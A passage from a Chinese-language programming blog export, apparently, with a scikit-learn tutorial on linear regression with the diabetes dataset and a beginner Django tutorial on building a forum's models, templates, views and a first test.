Each of these 10 feature variables have been mean centered and scaled by the standard deviation times `n_samples` (i.e. the sum of squares of each column totals 1). Source URL: https://www4.stat.ncsu.edu/~boos/var.select/diabetes.html For more information see: Bradley Efron, Trevor Hastie, Iain Johnstone and Robert Tibshirani (2004) &quot;Least Angle Regression,&quot; Annals of Statistics (with discussion), 407-499. (https://web.stanford.edu/~hastie/Papers/LARS/LeastAngle_2002.pdf)步骤三：打印diabetes数据集相关特征信息123456789# data 、target、统计数据总行数、target长度、每行的属性个数（特征数）、特征名称，数据的类型、data和taret数据集的类型print(\"数据：&#123;&#125;\\n\".format(diabetes.data,'\\n'))print(\"类标：\",diabetes.target,'\\n')print(\"数据总行数：\",len(diabetes.data))print(\"类标总长度：\",len(diabetes.target))print(\"特征数：\",len(diabetes.data[0]))print(\"特征名称：\",diabetes.feature_names)print(\"数据类型：\",diabetes.data.shape)print(\"data类型：\",type(diabetes.data),\"\\n target类型：\",type(diabetes.data)) 数据：[[ 0.03807591 0.05068012 0.06169621 ... -0.00259226 0.01990842 -0.01764613] [-0.00188202 -0.04464164 -0.05147406 ... -0.03949338 -0.06832974 -0.09220405] [ 0.08529891 0.05068012 0.04445121 ... -0.00259226 0.00286377 -0.02593034] ... [ 0.04170844 0.05068012 -0.01590626 ... -0.01107952 -0.04687948 0.01549073] [-0.04547248 -0.04464164 0.03906215 ... 0.02655962 0.04452837 -0.02593034] [-0.04547248 -0.04464164 -0.0730303 ... -0.03949338 -0.00421986 0.00306441]] 类标： [151. 75. 141. 206. 135. 97. 138. 63. 110. 310. 101. 69. 179. 185. 118. 171. 166. 144. 97. 168. 68. 49. 68. 245. 184. 202. 137. 85. 131. 283. 129. 59. 341. 87. 65. 102. 265. 276. 252. 90. 100. 55. 61. 92. 259. 53. 190. 142. 75. 142. 155. 225. 59. 104. 182. 128. 52. 37. 170. 170. 61. 144. 52. 128. 71. 163. 150. 97. 160. 178. 48. 270. 202. 111. 85. 42. 170. 200. 252. 113. 143. 51. 52. 210. 65. 141. 55. 134. 42. 111. 98. 164. 48. 96. 90. 162. 150. 279. 92. 83. 128. 102. 302. 198. 95. 53. 134. 144. 232. 81. 104. 59. 246. 297. 258. 229. 275. 281. 179. 200. 200. 173. 180. 84. 121. 161. 99. 109. 115. 268. 274. 158. 107. 83. 103. 272. 85. 280. 336. 281. 118. 317. 235. 60. 174. 259. 178. 128. 96. 126. 288. 88. 292. 71. 197. 186. 25. 84. 96. 195. 53. 217. 172. 131. 214. 59. 70. 220. 268. 152. 47. 74. 295. 101. 151. 127. 237. 225. 81. 151. 107. 64. 138. 185. 265. 101. 137. 143. 141. 79. 292. 178. 91. 116. 86. 122. 72. 129. 142. 90. 158. 39. 196. 222. 277. 99. 196. 202. 155. 77. 191. 70. 73. 49. 65. 263. 248. 296. 214. 185. 78. 93. 252. 150. 77. 208. 77. 108. 160. 53. 220. 154. 259. 90. 246. 124. 67. 72. 257. 262. 275. 177. 71. 47. 187. 125. 78. 51. 258. 215. 303. 243. 91. 150. 310. 153. 346. 63. 89. 50. 39. 103. 308. 116. 145. 74. 45. 115. 264. 87. 202. 127. 182. 241. 66. 94. 283. 64. 102. 200. 265. 94. 230. 181. 156. 233. 60. 219. 80. 68. 332. 248. 84. 200. 55. 85. 89. 31. 129. 83. 275. 65. 198. 236. 253. 124. 44. 172. 114. 142. 109. 180. 144. 163. 147. 97. 220. 190. 109. 191. 122. 230. 242. 248. 249. 192. 131. 237. 78. 135. 244. 199. 270. 164. 72. 96. 306. 91. 214. 95. 216. 263. 178. 113. 200. 139. 139. 88. 148. 88. 243. 71. 77. 109. 272. 60. 54. 221. 90. 311. 281. 182. 321. 58. 262. 206. 233. 242. 123. 167. 63. 197. 71. 168. 140. 217. 121. 235. 245. 40. 52. 104. 132. 88. 69. 219. 72. 201. 110. 51. 277. 63. 118. 69. 273. 258. 43. 198. 242. 232. 175. 93. 168. 275. 293. 281. 72. 140. 189. 181. 209. 136. 261. 113. 131. 174. 257. 55. 84. 42. 146. 212. 233. 91. 111. 152. 120. 67. 310. 94. 183. 66. 173. 72. 49. 64. 48. 178. 104. 132. 220. 57.] 数据总行数： 442 类标总长度： 442 特征数： 10 特征名称： [&apos;age&apos;, &apos;sex&apos;, &apos;bmi&apos;, &apos;bp&apos;, &apos;s1&apos;, &apos;s2&apos;, &apos;s3&apos;, &apos;s4&apos;, &apos;s5&apos;, &apos;s6&apos;] 数据类型： (442, 10) data类型： &lt;class &apos;numpy.ndarray&apos;&gt; target类型： &lt;class &apos;numpy.ndarray&apos;&gt;实验二：利用糖尿病数据集预测糖尿病实验步骤一：LinearRegression（线性回归）的引用 LinearRegression模型在Sklearn.linear_model下，它主要是通过fit(x,y)的方法来训练模型，其中x为数据的属性，y为所属类型。 线性模型：$$y = βX+b$$其中：(X:数据 y：目标变量 β：回归系数 b:观测噪声（bias，偏差) 引用回归模型，并输出函数原型 1234# 引用回归模型from sklearn import linear_model # 导入线性回归模型regr = linear_model.LinearRegression()# 使用线性回归print(regr) #输出函数原型 LinearRegression(copy_X=True, fit_intercept=True, n_jobs=None, normalize=False) 查看线性回归对象regr的属性和方法 1dir(regr) [&apos;__abstractmethods__&apos;, &apos;__class__&apos;, &apos;__delattr__&apos;, &apos;__dict__&apos;, &apos;__dir__&apos;, &apos;__doc__&apos;, &apos;__eq__&apos;, &apos;__format__&apos;, &apos;__ge__&apos;, &apos;__getattribute__&apos;, &apos;__getstate__&apos;, &apos;__gt__&apos;, &apos;__hash__&apos;, &apos;__init__&apos;, &apos;__init_subclass__&apos;, &apos;__le__&apos;, &apos;__lt__&apos;, &apos;__module__&apos;, &apos;__ne__&apos;, &apos;__new__&apos;, &apos;__reduce__&apos;, &apos;__reduce_ex__&apos;, &apos;__repr__&apos;, &apos;__setattr__&apos;, &apos;__setstate__&apos;, &apos;__sizeof__&apos;, &apos;__str__&apos;, &apos;__subclasshook__&apos;, &apos;__weakref__&apos;, &apos;_abc_impl&apos;, &apos;_decision_function&apos;, &apos;_estimator_type&apos;, &apos;_get_param_names&apos;, &apos;_get_tags&apos;, &apos;_more_tags&apos;, &apos;_preprocess_data&apos;, &apos;_set_intercept&apos;, &apos;copy_X&apos;, &apos;fit&apos;, &apos;fit_intercept&apos;, &apos;get_params&apos;, &apos;n_jobs&apos;, &apos;normalize&apos;, &apos;predict&apos;, &apos;score&apos;, &apos;set_params&apos;]步骤二：训练和预测方法基础 训练：fit(x,y)分析模型参数，填充数据集。其中x为特征，y为标记或类属性。 预测： predict()它通过fit()算出的模型参数构成的模型，对解释变量进行预测其类属性。预测方法将返回预测值y_pred。 步骤三：利用线性回归的示例1234567891011121314151617from sklearn import linear_model # 导入线性模型import matplotlib.pyplot as plt # 绘图import numpy as np# X 表示匹萨尺寸 Y表示匹萨价格X =[[6],[8],[10],[14],[18]]Y = [[7],[9],[13],[17.5],[18]]print(u'数据集X:',X)print(u'数据集Y:',Y)# 回归训练clf2 = linear_model.LinearRegression() # 使用线性回归clf2.fit(X,Y) # 导入数据集# 预测一张12英寸的价格res = clf2.predict(np.array([12]).reshape(1,1))[0]print(u'预测一张12英寸的匹萨价格：$%.2f'%res) 数据集X: [[6], [8], [10], [14], [18]] 数据集Y: [[7], [9], [13], [17.5], [18]] 预测一张12英寸的匹萨价格：$13.68 请解释np.array([12]).reshape(1,1)及字符串前加u的意义 1# 预测数据X2 = [[0],[10],[14],[25]]的结果 1234# 预测数据X2 = [[0],[10],[14],[25]]X2 = [[0],[10],[14],[25]]Y2 = clf2.predict(X2)print(Y2) [[ 1.96551724] [11.72844828] [15.63362069] [26.37284483]] 绘制线性回归图形 123456789plt.figure()plt.title(u'diameter-cost curver') #标题plt.xlabel(u'diameter') #x轴坐标plt.ylabel(u'cost') # y轴plt.axis([0,25,0,25]) #区间plt.grid(True) # 显示网格plt.plot(X,Y,'k.') #绘制训练数据集散点图plt.plot(X2,Y2,'g-')# 绘制预测数据集直线plt.show() 线性模型：$$y = βX+b$$其中回归系数β保存在coef_方法中，截距保存在intercept_中，score(X,y,sample_weight=None) 评分函数，返回一个小于1的得分，可能会小于0 1234#打印系数、截距、评分函数print(u'系数',clf2.coef_)print(u'截距',clf2.intercept_)print(u'评分函数',clf2.score(X,Y)) 系数 [[0.9762931]] 截距 [1.96551724] 评分函数 0.9100015964240102步骤四：糖尿病数据集划分 加载diabetes数据集,并打印数据集长度、数据类型、前四个样本数据 1234567from sklearn import datasetsimport numpy as np# 获取数据 10*442d =datasets.load_diabetes()x = d.dataprint(u'获取x特征',len(x),x.shape,x[:4]) 获取x特征 442 (442, 10) [[ 0.03807591 0.05068012 0.06169621 0.02187235 -0.0442235 -0.03482076 -0.04340085 -0.00259226 0.01990842 -0.01764613] [-0.00188202 -0.04464164 -0.05147406 -0.02632783 -0.00844872 -0.01916334 0.07441156 -0.03949338 -0.06832974 -0.09220405] [ 0.08529891 0.05068012 0.04445121 -0.00567061 -0.04559945 -0.03419447 -0.03235593 -0.00259226 0.00286377 -0.02593034] [-0.08906294 -0.04464164 -0.01159501 -0.03665645 0.01219057 0.02499059 -0.03603757 0.03430886 0.02269202 -0.00936191]] 获取第3列体重特征的数据,并打印前四行的数据 12x_one = x[:,np.newaxis,2]print(x_one[:4]) [[ 0.06169621] [-0.05147406] [ 0.04445121] [-0.01159501]] 获取类标target,并打印前四个 12y = d.targetprint(u'target:',y[:4]) target: [151. 75. 141. 206.] x特征划分：训练集和测试集；后42行作为测试集，剩余的作为训练集 1234567#训练集x_train = x_one[:-42]y_train = y[:-42]# 测试集x_test = x_one[-42:]y_test = y[-42:] 步骤五:糖尿病的线性回归实现12345678from sklearn import linear_modelclf = linear_model.LinearRegression()# 训练clf.fit(x_train,y_train)#预测pre = clf.predict(x_test)print(u'预测结果：&#123;&#125;\\n'.format(pre))print(u'真实结果：',y_test) 预测结果：[196.51241167 109.98667708 121.31742804 245.95568858 204.75295782 270.67732703 75.99442421 241.8354155 104.83633574 141.91879342 126.46776938 208.8732309 234.62493762 152.21947611 159.42995399 161.49009053 229.47459628 221.23405012 129.55797419 100.71606266 118.22722323 168.70056841 227.41445974 115.13701842 163.55022706 114.10695016 120.28735977 158.39988572 237.71514243 121.31742804 98.65592612 123.37756458 205.78302609 95.56572131 154.27961264 130.58804246 82.17483382 171.79077322 137.79852034 137.79852034 190.33200206 83.20490209] 真实结果： [175. 93. 168. 275. 293. 281. 72. 140. 189. 181. 209. 136. 261. 113. 131. 174. 257. 55. 84. 42. 146. 212. 233. 91. 111. 152. 120. 67. 310. 94. 183. 66. 173. 72. 49. 64. 48. 178. 104. 132. 220. 57.]步骤六:对上述预测结果进行评价 分别从预测结果和真实结果之间的平方和、线性回归模型的系数、截距、方差 12345cost = np.mean(y_test-pre)**2print('平方和：&#123;&#125;\\n'.format(cost))print('系数：&#123;&#125;\\n'.format(clf.coef_))print('截距：&#123;&#125;\\n'.format(clf.intercept_))print('决定系数：&#123;&#125;\\n'.format(clf.score(x_test,y_test))) 平方和：83.19234082703763 系数：[955.70303385] 截距：153.00018395675963 决定系数：0.42720426706720194​ 步骤七:绘图 分别绘制出测试集的真实散点图，预测的线性图，以及画出各个真实点到预测点的距离，并保存到diabetes.png中，dpi=300 12345678910111213import matplotlib.pyplot as pltplt.title('diabetes')plt.xlabel('x')plt.ylabel('y')plt.plot(x_test,y_test,'k.')# 测试集真实散点图plt.plot(x_test,pre,'g-')# 预测线性直线# 绘制真实点到预测点的线段for idx ,m in enumerate(x_test): plt.plot([m,m],[y_test[idx],pre[idx]],'r-') plt.savefig('diabetes.png',dpi=300)plt.show()","categories":[{"name":"人工智能","slug":"人工智能","permalink":"https://fishni.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据集","slug":"数据集","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E9%9B%86/"}]},{"title":"【Django】2. Django入门与实践-基础","slug":"2. Django入门与实践-基础","date":"2020-04-25T16:00:00.000Z","updated":"2020-04-26T12:24:03.984Z","comments":true,"path":"2020/04/26/2. Django入门与实践-基础/","link":"","permalink":"https://fishni.github.io/2020/04/26/2.%20Django%E5%85%A5%E9%97%A8%E4%B8%8E%E5%AE%9E%E8%B7%B5-%E5%9F%BA%E7%A1%80/","excerpt":"本文主要内容：简单讨论了项目的背景知识，然后学习Django的基础，包括模型，管理后台，视图，模板和路由等。","text":"本文主要内容：简单讨论了项目的背景知识，然后学习Django的基础，包括模型，管理后台，视图，模板和路由等。 前言在第一节入门中，安装了项目所需要的一切，安装的是 Python3.6，并且在虚拟环境中运行 Django1.11，本文继续在这个项目上编写代码。 本文先讨论一些项目的背景知识，然后在学习Django的基础，包括：模型（models），管理后台（admin），视图（views）,模板（templates）和路由（URLs） 论坛项目通过实际的项目学习知识，是个不错的方法，所以在学习模型，视图等其它有趣部分前，简要的讨论我将要开发的这个项目。 下图关于Web应用程序建模和设计上的一些见解。Web开发和软件开发可不仅仅只是编码。 用例图这个项目是一个论坛系统，整个项目的构思是维护几个论坛版块（boards），每个版块像一个分类一样。在指定的版块里面，用户可以通过创建新主题（Topic）开始讨论，其他用户可以参与讨论回复。 首先需要找到一种方法来区分普通用户和管理员用户，因为只有管理员可以创建版块。下图概述了主要的用例和每种类型的用户角色： 图1：Web Board提供的核心功能用例图 ### 类图 从用例图中，可以开始思考项目所需的实体类有哪些。这些实体就是我们要创建的模型，它与我们的Django应用程序处理的数据非常密切。 为了能够实现上面描述的用例，我们需要至少实现下面几个模型：Board，Topic，Post和User。 图2：Web Board类图 Board：版块 Topic：主题 Post：帖子（译注：其实就是主题的回复或评论） 花点时间考虑模型之间如何相互关联也很重要。类与类之间的实线告诉我们，在一个主题（Topic）中，我们需要有一个字段（译注：其实就是通过外键来关联）来确定它属于哪个版块（Board）。同样，帖子（Post）也需要一个字段来表示它属于哪个主题，这样我们就可以列出在特定主题内创建的帖子。最后，我们需要一个字段来表示主题是谁发起的，帖子是谁发的。 用户和版块之间也有联系，谁创建的版块。但是这些信息与应用程序无关。还有其他方法可以跟踪这些信息，稍后会谈到。 现在我们的类图有基本的表现形式，还要考虑这些模型将承载哪些信息。避免让事情变得复杂，试着先把重要的内容列出来，这些内容是启动项目需要的信息。后面我们再使用 Django 的迁移（Migrations）功能来改进模型，将在下一节中详细了解这些内容。 但就目前而言，这是模型最基本的内容： 图3：强调类（模型）之间关系的类图 这个类图强调的是模型之间的关系，这些线条和箭头最终会在稍后转换为字段。 对于 Board 模型，我们将从两个字段开始：name 和 description。 name字段必须是唯一的，为了避免有重复的名称。description 用于说明这个版块是做什么用的。 Topic 模型包括四个字段：subject 表示主题内容，last_update 用来定义话题的排序，starter 用来识别谁发起的话题，board 用于指定它属于哪个版块。 Post 模型有一个 message 字段，用于存储回复的内容，created_at 在排序时候用（最先发表的帖子排最前面），updated_at 告诉用户是否更新了内容，同时，还需要有对应的 User 模型的引用，Post 由谁创建的和谁更新的。 最后是 User 模型。在类图中，我只提到了字段 username，password，email， is_superuser 标志，因为这几乎是我们现在要使用的所有东西。 需要注意的是，我们不需要创建 User 模型，因为Django已经在contrib包中内置了User模型，我们将直接拿来用。 关于类图之间的对应关系（数字 1，0..* 等等），这里教你如何阅读： 一个topic 必须与一个（1）Board（这意味着它不能为空）相关联，但是 Board 下面可能与许多个或者0个 topic 关联 (0..*)。这意味着 Board 下面可能没有主题。（译注：一对多关系） 一个 Topic 至少有一个 Post（发起话题时，同时会发布一个帖子），并且它也可能有许多 Post（1..*）。一个Post 必须与一个并且只有一个Topic（1）相关联。 一个 Topic 必须有一个且只有一个 User 相关联，topic 的发起者是（1）。而一个用户可能有很多或者没有 topic（0..*）。 Post 必须有一个并且只有一个与之关联的用户，用户可以有许多或没有 Post（0..*）。Post 和 User之间的第二个关联是直接关联（参见该行最后的箭头），就是 Post 可以被用户修改（updated_by），updated_by 有可能是空（Post 没有被修改） 画这个类图的另一种方法是强调字段而不是模型之间的关系： 图4：强调类（模型）与属性（字段）的类图 上面的表示方式与前面的表示方式是对等的，不过这种方式更接近我们将要使用 Django Models API 设计的内容。在这种表示方式中，我们可以更清楚地看到，在 Post 模型中，关联了 Topic，created_by（创建者）和 updated_by（更新者）字段。另一个值得注意的事情是，在 Topic 模型中，有一个名为` posts（）`的操作（一个类方法）。我们将通过反向关系来实现这一目标，Django 将自动在数据库中执行查询以返回特定主题的所有帖子列表。 好了，现在已经够UML了！为了绘制本节介绍的图表，我使用了StarUML 工具。 线框图（原型图）花了一些时间来设计应用程序的模型后，创建一些线框来定义需要完成的工作，并且清楚地了解我们将要做什么。 基于线框图，我们可以更深入地了解应用程序中涉及的实体。 首先，我们需要在主页上显示所有版块： 图5：论坛项目线框主页列出所有可用的版块 如果用户点击一个链接，比如点击Django版块，它应该列出所有Django相关的主题： 图6：论坛项目线框图列出了Django版块中的所有主题 这里有两个入口：用户点击“new topic“ 按钮创建新主题，或者点击主题链接查看或参与讨论。 “new topic” 页面： 现在，主题页面显示了帖子和讨论： 如果用户点击回复按钮，将看到下面这个页面，并以倒序的方式（最新的在第一个）显示帖子列表： 绘制这些线框，你可以使用draw.io服务，它是免费的。 模型这些模型基本上代表了应用程序的数据库设计。接下来要做的是创建 Django 所表示的类，这些类是上面建模的类：Board，Topic和Post。User 模型被命名为内置应用叫auth，它以命名空间django.contrib.auth 的形式出现在 INSTALLED_APPS 配置中。 我们要做的工作都在 boards/models.py 文件中。以下是我们在Django应用程序中如何表示类图的代码： 1234567891011121314151617181920from django.db import modelsfrom django.contrib.auth.models import Userclass Board(models.Model): name = models.CharField(max_length=30, unique=True) description = models.CharField(max_length=100)class Topic(models.Model): subject = models.CharField(max_length=255) last_updated = models.DateTimeField(auto_now_add=True) board = models.ForeignKey(Board, related_name='topics') starter = models.ForeignKey(User, related_name='topics')class Post(models.Model): message = models.TextField(max_length=4000) topic = models.ForeignKey(Topic, related_name='posts') created_at = models.DateTimeField(auto_now_add=True) updated_at = models.DateTimeField(null=True) created_by = models.ForeignKey(User, related_name='posts') updated_by = models.ForeignKey(User, null=True, related_name='+') 所有模型都是django.db.models.Model类的子类。每个类将被转换为数据库表。每个字段由 django.db.models.Field子类（内置在Django core）的实例表示，它们并将被转换为数据库的列。 字段 CharField,DateTimeField等等，都是 django.db.models.Field 的子类，包含在Django的核心里面,随时可以使用。 在这里，我们仅使用 CharField，TextField，DateTimeField，和ForeignKey 字段来定义我们的模型。不过在Django提供了更广泛的选择来代表不同类型的数据，例如 IntegerField，BooleanField， DecimalField和其它一些字段。我们会在需要的时候提及它们。 有些字段需要参数，例如CharField。我们应该始终设定一个 max_length。这些信息将用于创建数据库列。Django需要知道数据库列需要多大。该max_length参数也将被Django Forms API用来验证用户输入。 在Board模型定义中，更具体地说，在name字段中，我们设置了参数 unique=True，顾名思义，它将强制数据库级别字段的唯一性。 在Post模型中，created_at字段有一个可选参数，auto_now_add设置为True。这将告诉Django创建Post对象时为当前日期和时间。 模型之间的关系使用ForeignKey字段。它将在模型之间创建一个连接，并在数据库级别创建适当的关系（译注：外键关联）。该ForeignKey字段需要一个位置参数related_name，用于引用它关联的模型。（译注：例如 created_by是外键字段，关联的User模型，表明这个帖子是谁创建的，related_name=posts 表示在User那边可以使用 user.posts来查看这个用户创建了哪些帖子） 例如，在Topic模型中，board字段是Board模型的ForeignKey。它告诉Django，一个Topic实例只涉及一个Board实例。related_name参数将用于创建反向关系，Board实例通过属性topics访问属于这个版块下的Topic列表。 Django自动创建这种反向关系，related_name是可选项。但是，如果我们不为它设置一个名称，Django会自动生成它：(class_name)_set。例如，在Board模型中，所有Topic列表将用topic_set属性表示。而这里我们将其重新命名为了topics，以使其感觉更自然。 在Post模型中，该updated_by字段设置related_name=&#39;+&#39;。这指示Django我们不需要这种反向关系，所以它会被忽略（译注：也就是说我们不需要关系用户修改过哪些帖子）。 下面可以看到类图和Django模型的源代码之间的比较，绿线表示我们如何处理反向关系。 这时，你可能会问自己：“主键/ ID呢？”？如果我们没有为模型指定主键，Django会自动为我们生成它。所以现在一切正常。在下一节中，您将看到它是如何工作的。 迁移模型下一步是告诉Django创建数据库，以便我们可以开始使用它。 打开终端 ，激活虚拟环境，转到 manage.py文件所在的文件夹，然后运行以下命令： python manage.py makemigrations 会看到输出内容是： Migrations for 'boards': boards/migrations/0001_initial.py - Create model Board - Create model Post - Create model Topic - Add field topic to post - Add field updated_by to post 如图： 此时，Django 在 boards/migrations目录创建了一个名为 0001_initial.py的文件。它代表了应用程序模型的当前状态。再下一步，Django将使用该文件创建表和列。 迁移文件将被翻译成SQL语句。如果您熟悉SQL，则可以运行以下命令来检验将是要被数据库执行的SQL指令 python manage.py sqlmigrate boards 0001 如图： ![](https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django04.jpg) 如果你不熟悉SQL，也不要担心。在本系列教程中，我们不会直接使用SQL。所有的工作都将使用Django ORM来完成，它是一个与数据库进行通信的抽象层。 下一步是将我们生成的迁移文件应用到数据库： python manage.py migrate 输出内容应该是这样的： 因为这是我们第一次迁移数据库，所以migrate命令把Django contrib app 中现有的迁移文件也执行了，这些内置app列在了INSTALLED_APPS。这是预料之中的。 Applying boards.0001_initial... OK是我们在上一步中生成的迁移脚本 好了！我们的数据库已经可以使用了。 需要注意的是SQLite是一个产品级数据库。SQLite被许多公司用于成千上万的产品，如所有Android和iOS设备，主流的Web浏览器，Windows 10，MacOS等。 但这不适合所有情况。SQLite不能与MySQL，PostgreSQL或Oracle等数据库进行比较。大容量的网站，密集型写入的应用程序，大的数据集，高并发性的应用使用SQLite最终都会导致问题。 我们将在开发项目期间使用SQLite，因为它很方便，不需要安装其他任何东西。当我们将项目部署到生产环境时，再将切换到PostgreSQL（译注：后续，我们后面可能使用MySQL）。对于简单的网站这种做法没什么问题。但对于复杂的网站，建议在开发和生产中使用相同的数据库。 试验Models API使用Python进行开发的一个重要优点是交互式shell,这是一种快速尝试和试验API的方法 可以使用manage.py 工具加载我们的项目来启动 Python shell ： python manage.py shell 如图： ![](https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20422django06.jpg) 这与直接输入python指令来调用交互式控制台是非常相似的，除此之外，项目将被添加到sys.path并加载Django。这意味着我们可以在项目中导入我们的模型和其他资源并使用它。 让我们从导入Board类开始： 1from boards.models import Board 要创建新的 boarrd 对象，我们可以执行以下操作： 1board = Board(name='Django', description='This is a board about Django.') 为了将这个对象保存在数据库中，我们必须调用save方法： 1board.save() save方法用于创建和更新对象。这里Django创建了一个新对象，因为这时Board 实例没有id。第一次保存后，Django会自动设置ID： board.id1 可以将其余的字段当做Python属性访问： 如图： 要更新一个值，我们可以这样做： 12board.description = 'Django discussion board.'board.save() 每个Django模型都带有一个特殊的属性; 我们称之为模型管理器(Model Manager)。你可以通过属性objects来访问这个管理器，它主要用于数据库操作。例如，我们可以使用它来直接创建一个新的Board对象： 1board = Board.objects.create(name='Python', description='General discussion about Python.') 访问属性： 所以，现在我们有两个版块了。我们可以使用objects列出数据库中所有现有的版块： 1Board.objects.all() 123&gt;&gt;&gt; Board.objects.all()&lt;QuerySet [&lt;Board: Board object&gt;, &lt;Board: Board object&gt;]&gt;&gt;&gt;&gt; 结果是一个QuerySet。稍后我们会进一步了解。基本上，它是从数据库中查询的对象列表。我们看到有两个对象，但显示的名称是 Board object。这是因为我们尚未实现 Board 的__str__方法。 __str__方法是对象的字符串表示形式。我们可以使用版块的名称来表示它。 首先，退出交互式控制台： 1exit() 现在编辑boards app 中的 models.py 文件： 123456class Board(models.Model): name = models.CharField(max_length=30, unique=True) description = models.CharField(max_length=100) def __str__(self): return self.name 重新查询，再次进入交互式控制台： 1234&gt;&gt;&gt; from boards.models import Board&gt;&gt;&gt; Board.objects.all()&lt;QuerySet [&lt;Board: Django&gt;, &lt;Board: Python&gt;]&gt;&gt;&gt;&gt; 我们可以将这个QuerySet看作一个列表。假设我们想遍历它并打印每个版块的描述： 1234567&gt;&gt;&gt; boards_list = Board.objects.all()&gt;&gt;&gt; for board in boards_list:... print(board.description)... Django discussion board.General discussion about Python.&gt;&gt;&gt; 同样，我们可以使用模型的 管理器（Manager） 来查询数据库并返回单个对象。为此，我们要使用 get方法： 123&gt;&gt;&gt; django_board = Board.objects.get(id=1)&gt;&gt;&gt; django_board.name'Django' 但我们必须小心这种操作。如果我们试图查找一个不存在的对象，例如，查找id=3的版块，它会引发一个异常： 123&gt;&gt;&gt; board = Board.objects.get(id=3)boards.models.DoesNotExist: Board matching query does not exist. get方法的参数可以是模型的任何字段，但最好使用可唯一标识对象的字段来查询。否则，查询可能会返回多个对象，这也会导致异常。 123&gt;&gt;&gt; Board.objects.get(name='Django')&lt;Board: Django&gt;&gt;&gt;&gt; 请注意，查询区分大小写，小写“django”不匹配： 操作 代码示例 创建一个对象而不保存 board = Board() 保存一个对象（创建或更新） board.save() 数据库中创建并保存一个对象 Board.objects.create(name='...',description='...') 列出所有对象 Board.objects.all() 通过字段标识获取单个对象 Board.objects.get(id=1) 视图，模板，静态文件目前我们已经有一个视图函数叫home,这个视图在我们的应用程序主页上显示为“Hello，World！” myproject/urls.py 123456789from django.conf.urls import urlfrom django.contrib import adminfrom boards import viewsurlpatterns = [ url(r'^$', views.home, name='home'), url(r'^admin/', admin.site.urls),] boards/views.py 1234from django.http import HttpResponsedef home(request): return HttpResponse('Hello, World!') 我们可以从这里开始写。如果你回想起我们的原型图，图5显示了主页应该是什么样子。我们想要做的是在表格中列出一些版块的名单以及它们的描述信息。 首先要做的是导入Board模型并列出所有的版块 12345678910111213from django.http import HttpResponsefrom .models import Boarddef home(request): boards = Board.objects.all() boards_names = list() for board in boards: boards_names.append(board.name) response_html = '&lt;br&gt;'.join(boards_names) return HttpResponse(response_html) 运行结果就是这个简单的HTML页面： 真正的项目里面我们不会这样去渲染HTML。对于这个简单视图函数，我们做的就是列出所有版块，然后渲染部分是Django模板引擎的职责。 Django模板引擎设置在manage.py所在的目录创建一个名为 templates的新文件夹： myproject/ |-- myproject/ | |-- boards/ | |-- myproject/ | |-- templates/ &lt;-- 这里 | +-- manage.py +-- venv/ 在templates文件夹中，创建一个名为home.html的HTML文件： templates/home.html 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;Boards&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Boards&lt;/h1&gt; &#123;% for board in boards %&#125; &#123;&#123; board.name &#125;&#125; &lt;br&gt; &#123;% endfor %&#125; &lt;/body&gt;&lt;/html&gt; 在上面的例子中，我们混入了原始HTML和一些特殊标签 {% for ... in ... %} 和{{ variable }} 。它们是Django模板语言的一部分。上面的例子展示了如何使用 for遍历列表对象。{{ board.name }}会在 HTML 模板中会被渲染成版块的名称，最后生成动态HTML文档。 在我们可以使用这个HTML页面之前，我们必须告诉Django在哪里可以找到我们应用程序的模板。 打开myproject目录下面的settings.py文件，搜索TEMPLATES变量，并设置DIRS 的值为os.path.join(BASE_DIR, &#39;templates&#39;) 1234567891011121314151617TEMPLATES = [ &#123; 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [ os.path.join(BASE_DIR, 'templates') ], 'APP_DIRS': True, 'OPTIONS': &#123; 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], &#125;, &#125;,] 本质上，刚添加的这一行所做的事情就是找到项目的完整路径并在后面附加“/templates” 我们可以使用Python shell进行调试 python manage.py shell 1234567&gt;&gt;&gt; from django.conf import settings&gt;&gt;&gt; settings.BASE_DIR'/home/humen/Development/myproject/myproject'&gt;&gt;&gt; import os&gt;&gt;&gt; os.path.join(settings.BASE_DIR,'templates')'/home/humen/Development/myproject/myproject/templates'&gt;&gt;&gt; 从上面看到，添加部分只是指向我们在前面步骤中创建的templates文件夹 现在我们可以更新home视图： boards/views.py 123456from django.shortcuts import renderfrom .models import Boarddef home(request): boards = Board.objects.all() return render(request, 'home.html', &#123;'boards': boards&#125;) 生成HTML； 我们可以用一个更漂亮的表格来替换，改进HTML模板： templates/home.html 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;Boards&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Boards&lt;/h1&gt; &lt;table border=\"1\"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;Board&lt;/th&gt; &lt;th&gt;Posts&lt;/th&gt; &lt;th&gt;Topics&lt;/th&gt; &lt;th&gt;Last Post&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &#123;% for board in boards %&#125; &lt;tr&gt; &lt;td&gt; &#123;&#123; board.name &#125;&#125;&lt;br&gt; &lt;small style=\"color: #888\"&gt;&#123;&#123; board.description &#125;&#125;&lt;/small&gt; &lt;/td&gt; &lt;td&gt;0&lt;/td&gt; &lt;td&gt;0&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125; &lt;/tbody&gt; &lt;/table&gt; &lt;/body&gt;&lt;/html&gt; 测试主页 测试将是一个反复出现的主题，我将在学习整个教程系列中探讨不同的概念和策略。 开始写第一个测试。现在，我们将在boards应用程序内的tests.py文件中操作 boards/tests.py 12345678from django.core.urlresolvers import reversefrom django.test import TestCaseclass HomeTests(TestCase): def test_home_view_status_code(self): url = reverse('home') response = self.client.get(url) self.assertEquals(response.status_code, 200) 